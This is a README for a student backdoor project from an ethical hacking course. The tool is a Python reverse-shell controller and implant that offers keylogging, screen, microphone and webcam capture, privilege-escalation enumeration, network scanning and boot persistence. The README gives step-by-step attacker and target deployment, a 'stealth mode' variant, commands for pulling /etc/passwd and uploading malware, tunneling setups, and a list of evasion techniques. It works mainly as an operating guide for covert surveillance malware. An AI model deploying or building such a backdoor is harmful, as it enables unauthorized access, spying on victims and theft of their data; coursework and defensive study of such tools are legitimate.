# Enhanced Python Backdoor - DES484 Assignment

**⚠️ EDUCATIONAL PURPOSE ONLY - ETHICAL HACKING CLASS PROJECT**

This is an enhanced reverse shell backdoor created for the DES484 Ethical Hacking course at SIIT. This project demonstrates advanced post-exploitation techniques and backdoor development concepts.

## 📋 Project Structure

```
DES484_Backdoor/
├── backend.py                    # Attacker controller (runs on attacker machine)
├── server.py                     # Backdoor client (deploys on target machine)
├── features/                     # Feature modules
│   ├── keylogger.py             # Keystroke logging
│   ├── privilege_escalation.py  # Privilege escalation techniques
│   ├── screen_audio_capture.py  # Screen, audio, and webcam capture
│   ├── network_discovery.py     # Network reconnaissance
│   └── persistence.py           # Persistence mechanisms
├── logs/                        # Logs directory (auto-created)
│   ├── keylog.txt              # Keystroke logs
│   ├── screenshots/            # Captured screenshots
│   ├── audio/                  # Audio recordings
│   └── webcam/                 # Webcam captures
├── requirements.txt             # Python dependencies (optional)
├── requirements_minimal.txt     # Minimal deployment (no dependencies)
└── README.md                    # This file
```

## 🎯 Features Implemented

### 1. **Keylogger** ⌨️

- Real-time keystroke capture
- Logs keystrokes to file with timestamps
- Works with or without external libraries (fallback mode)
- Commands: `keylog_start`, `keylog_stop`, `keylog_dump`, `keylog_clear`

### 2. **Privilege Escalation** 🔐

- Check current privilege level
- Enumerate SUID binaries (Linux/macOS)
- Find sudo opportunities
- Discover writable system paths
- List running services
- Check scheduled tasks
- Find sensitive files
- Commands: `priv_check`, `priv_enum`, `priv_services`, `priv_tasks`

### 3. **Screen & Media Capture** 📸

- Screenshot capture (single or multiple)
- Audio recording from microphone
- Webcam image capture
- Multiple fallback methods for compatibility
- Commands: `screenshot`, `audio_record`, `webcam_snap`

### 4. **Network Discovery** 🌐

- Network interface enumeration
- Local network scanning (ping sweep)
- Port scanning on remote hosts
- Active connection monitoring
- ARP cache inspection
- Public IP detection
- Internet connectivity check
- Commands: `net_info`, `net_scan`, `net_portscan`, `net_connections`

### 5. **Persistence** 🔄

- Automatic startup on system boot
- Platform-specific implementations (Windows, Linux, macOS)
- Multiple persistence techniques
- Commands: `persist_install`, `persist_check`, `persist_remove`

## 🚀 Installation & Setup

### Prerequisites

- Python 3.6 or higher
- Network connectivity between attacker and target machines

### For Attacker Machine (Controller)

1. **Clone or download the project:**

   ```bash
   cd ~/Desktop
   git clone <repository> DES484_Backdoor
   cd DES484_Backdoor
   ```

2. **Install required libraries (recommended):**

   ```bash
   pip3 install -r requirements.txt
   ```

   This installs:

   - `pynput` - Keylogger functionality
   - `Pillow` - Screenshot capture
   - `pyautogui` - Screen automation
   - `pyaudio` - Audio recording
   - `opencv-python` - Webcam capture

   **Note:** The controller script (`backend.py`) uses only standard Python libraries, but if you're building executables or testing features locally, install these dependencies.

3. **Find your IP address:**

   ```bash
   # Linux/macOS
   ifconfig | grep "inet "
   # or
   ip addr show

   # Windows
   ipconfig
   ```

4. **Start the listener:**
   ```bash
   python3 backend.py
   # Or specify custom port:
   python3 backend.py 5555
   ```

### For Target Machine (Backdoor Client)

#### Method 1: Full Installation (Recommended for testing)

1. **Copy the entire project to target:**

   ```bash
   scp -r DES484_Backdoor user@target:/tmp/
   ```

2. **Install optional dependencies:**

   ```bash
   cd /tmp/DES484_Backdoor
   pip install -r requirements.txt
   ```

3. **Configure the backdoor:**
   Edit `server.py` and change the connection settings:

   ```python
   ATTACKER_HOST = '192.168.1.12'  # Your attacker IP
   ATTACKER_PORT = 5555            # Your listener port
   ```

4. **Run the backdoor:**
   ```bash
   python3 server.py
   ```

#### Method 2: Minimal Deployment (Stealth Mode)

**For environments without external libraries:**

1. **Copy only necessary files:**

   ```bash
   # Copy server.py and features/ directory
   scp -r server.py features/ user@target:/tmp/backdoor/
   ```

2. **Run without dependencies:**

   ```bash
   cd /tmp/backdoor
   python3 server.py
   ```

   The backdoor will use fallback methods (system commands) for all features.

#### Method 3: Single-File Deployment (Advanced)

**For minimal footprint**, you can embed the features into `server.py` or use only basic features:

```bash
# Edit server.py to disable features if imports fail
python3 server.py
```

## 📖 Usage Guide

### Starting the Attack

1. **Start the controller on attacker machine:**

   ```bash
   python3 backend.py
   ```

   Output:

   ```
   [+] Listening on 0.0.0.0:5555
   [*] Waiting for incoming connections...
   ```

2. **Deploy and run backdoor on target:**

   ```bash
   python3 server.py
   ```

3. **Connection established:**
   ```
   [+] Connection established from 192.168.1.50:54321
   === System Information ===
   Hostname: target-machine
   System: Darwin
   ...
   ```

### Basic Commands

```bash
# Get help
help
help_advanced
quick

# System information
sysinfo

# Execute shell commands
ls -la
whoami
cat /etc/passwd

# File operations
download /etc/passwd
upload malware.exe
cd /tmp

# Exit
quit
```

### Advanced Features

#### Keylogger

```bash
# Start capturing keystrokes
keylog_start

# Check captured keystrokes
keylog_dump

# Stop keylogger
keylog_stop

# Clear logs
keylog_clear
```

#### Privilege Escalation

```bash
# Check current privileges
priv_check

# Enumerate escalation vectors
priv_enum

# List services (potential vulnerabilities)
priv_services

# Find scheduled tasks
priv_tasks

# Search for sensitive files
priv_sensitive
```

#### Screen Capture

```bash
# Take single screenshot
screenshot

# Take multiple screenshots (5 shots, 2 seconds apart)
screenshot_multi 5 2

# List captured screenshots
screenshot_list

# Download screenshot
download logs/screenshots/screenshot_20241002_143022.png
```

#### Audio & Webcam

```bash
# Record audio for 10 seconds
audio_record 10

# List recordings
audio_list

# Capture webcam image
webcam_snap

# Download recordings
download logs/audio/audio_20241002_143530.wav
```

#### Network Discovery

```bash
# Get network information
net_info

# Scan local network for hosts
net_scan

# Show active connections
net_connections

# Scan ports on specific host
net_portscan 192.168.1.1

# Get public IP
net_public_ip

# Check internet connectivity
net_check_internet
```

#### Persistence

```bash
# Install persistence
persist_install

# Check if persistence is installed
persist_check

# Remove persistence
persist_remove
```

## 🔧 Troubleshooting

### Connection Issues

**Problem:** Target can't connect to attacker

```bash
# On attacker machine, check firewall:
sudo ufw allow 5555/tcp          # Linux
sudo firewall-cmd --add-port=5555/tcp  # CentOS/RHEL

# Verify listener is running:
netstat -an | grep 5555
```

**Problem:** Wrong IP address

```bash
# Find correct IP:
ip addr show                      # Linux
ifconfig                          # macOS
ipconfig                          # Windows
```

### Feature Not Working

**Problem:** "Feature not available"

```bash
# Check if feature modules exist:
ls features/

# Install dependencies:
pip install -r requirements.txt

# Or use fallback mode (features use system commands)
```

**Problem:** Import errors

```bash
# The backdoor is designed to work without external libraries
# Features automatically use fallback methods

# To use full features, install:
pip install pynput Pillow pyautogui pyaudio opencv-python
```

### Permission Issues

**Problem:** Permission denied

```bash
# Run with appropriate permissions:
sudo python3 server.py            # For privileged operations

# Or use privilege escalation features:
priv_enum                         # Find escalation vectors
```

## 🌐 Network Configuration

### Same Network (LAN)

```python
# In server.py:
ATTACKER_HOST = '192.168.1.12'    # Attacker's local IP
ATTACKER_PORT = 5555
```

### Different Networks (WAN/Internet)

**Method 1: Port Forwarding**

```bash
# On attacker's router:
# Forward external_port -> attacker_ip:5555

# In server.py:
ATTACKER_HOST = 'attacker_public_ip'
ATTACKER_PORT = external_port
```

**Method 2: Reverse SSH Tunnel**

```bash
# On target:
ssh -R 5555:localhost:5555 user@attacker_public_ip

# In server.py:
ATTACKER_HOST = 'localhost'
ATTACKER_PORT = 5555
```

**Method 3: VPN**

```bash
# Use VPN to create virtual LAN
# Both machines connect to same VPN
# Use VPN IP addresses
```

## 🛡️ Detection & Evasion

### Current Implementation

- Standard library usage (minimal dependencies)
- Basic obfuscation in feature names
- Fallback to system commands
- Resilient reconnection

### Potential Detection Methods

- Network monitoring (unusual connections)
- Process monitoring (python processes)
- File integrity monitoring
- Antivirus signatures

### Evasion Techniques (Educational)

1. **Code obfuscation** - Use PyArmor or similar
2. **Encryption** - Encrypt communications
3. **Process injection** - Hide in legitimate processes
4. **Rootkit techniques** - Hide files/processes
5. **Traffic tunneling** - Use HTTPS, DNS tunneling

## 📚 Learning Objectives

This project demonstrates:

1. ✅ Reverse shell implementation
2. ✅ Post-exploitation techniques
3. ✅ Privilege escalation enumeration
4. ✅ Data exfiltration methods
5. ✅ Persistence mechanisms
6. ✅ Network reconnaissance
7. ✅ Cross-platform compatibility
8. ✅ Fallback mechanisms for reliability

## ⚖️ Ethical Guidelines

**IMPORTANT:** This tool is for **AUTHORIZED TESTING ONLY**

### Legal Usage

✅ Your own systems
✅ Lab environments with permission
✅ Authorized penetration testing engagements
✅ Educational research with consent

### Illegal Usage

❌ Unauthorized access to systems
❌ Malicious purposes
❌ Violating privacy laws
❌ Without written authorization

**Disclaimer:** The authors are not responsible for misuse of this tool. Users must comply with all applicable laws and ethical guidelines.

## 📝 Assignment Completion Checklist

- [x] Keylogger feature implemented
- [x] Privilege escalation techniques included
- [x] Screen and audio recording functional
- [x] Additional features (network discovery, persistence)
- [x] Clean project structure
- [x] Comprehensive documentation
- [x] Cross-platform compatibility
- [x] Fallback mechanisms for reliability
- [x] Professional code organization

## 🎓 Credits

- Original Template: Dr. Watthanasak Jeamwatthanachai
- Course: DES484 Ethical Hacking
- Institution: SIIT (Sirindhorn International Institute of Technology)
- Year: 2024

## 📞 Support

For questions or issues related to this assignment:

- Consult course materials
- Ask instructor or TAs
- Review code comments and documentation

---

**Remember: With great power comes great responsibility. Use ethical hacking skills to protect, not to harm.**
